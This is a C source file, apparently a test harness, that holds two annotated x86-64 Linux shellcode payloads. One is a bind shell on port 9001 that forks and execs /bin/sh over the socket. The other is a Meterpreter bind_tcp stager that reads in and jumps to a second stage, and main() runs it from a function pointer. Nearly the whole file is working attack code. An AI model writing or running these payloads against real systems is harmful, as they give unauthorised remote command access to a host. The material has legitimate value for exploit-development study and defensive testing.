#include <stdio.h>

unsigned char shell_bind_tcp[] = 
"\x55\x48\x89\xe5"                          // push %rbp ; mov %rbp, %rsp
"\x48\x83\xec\x20"                          // sub $0x20, %rsp

// create socket
"\x6a\x29"                                  // push $0x29;
"\x58"                                      // pop %rax
"\x99"                                      // cdq
"\x6a\x02"                                  // push $0x2
"\x5f"                                      // pop %rdi
"\x6a\x01"                                  // push $0x1
"\x5e"                                      // pop %rsi
"\x0f\x05"                                  // syscall

// bind socket to port 9001
"\x48\x97"                                  // xchg %rdi, %rax
"\x52"                                      // push %rdx
"\xc7\x04\x24\x02\x00\x23\x29"              // mov $0x29230002, (%rsp)
"\x48\x89\xe6"                              // mov %rsp, %rsi
"\x6a\x10"                                  // push $0x10
"\x5a"                                      // pop %rdx
"\x6a\x31"                                  // push $0x31
"\x58"                                      // pop %rax
"\x0f\x05"                                  // syscall

// set socket to listening
"\x6a\x32"                                  // push $0x32
"\x58"                                      // pop %rax
"\x0f\x05"                                  // syscall

// accept a connection, new socket is at %rax fd
"\x48\x31\xf6"                              // xor %rsi, %rsi
"\x6a\x2b"                                  // push $0x2b
"\x58"                                      // pop %rax
"\x0f\x05"                                  // syscall

// rdi became the connect socket
"\x48\x97"                                  // xchg %rdi, %rax

// create a child process (sys_fork)
"\x6a\x39"                                  // push $0x39
"\x58"                                      // pop %rax
"\x0f\x05"                                  // syscall

"\x48\x83\xf8\x00"                          // cmp %rax, $0x0
"\x75\x26"                                  // jne

// connect STDOUT, STDIN and STDERR to socket file descriptor
"\x6a\x03"                                  // push $0x3
"\x5e"                                      // pop %rsi
"\x48\xff\xce"                              // dec %rsi
"\x6a\x21"                                  // push $0x21
"\x58"                                      // pop %rax
"\x0f\x05"                                  // syscall
"\x75\xf6"                                  // jne

// replace process image with "/bin/sh"
"\x6a\x3b"                                  // push $0x3b
"\x58"                                      // pop %rax
"\x99"                                      // cdq
"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  // mov $0x68732f6e69622f, %rbx
"\x53"                                      // push %rbx
"\x48\x89\xe7"                              // push %rsp, %rdi
"\x52"                                      // push %rdx
"\x57"                                      // push %rdi
"\x48\x89\xe6"                              // mov %rsp, %rsi
"\x0f\x05"                                  // syscall

"\xc9\xc3"                                  // leave ; ret
;

unsigned char meterpreter_bind_tcp[] = 
"\x55\x48\x89\xe5"                          // push %rbp ; mov %rbp, %rsp

// create a child process (sys_fork)
"\x6a\x39"                                  // push $0x39
"\x58"                                      // pop %rax
"\x0f\x05"                                  // syscall

"\x48\x83\xf8\x00"                          // cmp %rax, $0x0

// jne short - 78 bytes forward, right after meterpreter shellcode
"\x75\x4e"                                  // jne

"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x23\x29\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x59\x6a\x32\x58\x0f\x05\x48\x96\x6a\x2b\x58\x0f"
"\x05\x50\x56\x5f\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31"
"\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x96\x48\x97\x5f\x0f"
"\x05\xff\xe6" // meterpreter shellcode

"\xc9\xc3"                                  // leave ; ret
;

int main() {
    void (*ptr)() = (void(*)())meterpreter_bind_tcp;
    printf("shellcode ptr: %#x\n", ptr);
    ptr();
    printf("exiting shellcode\n");
}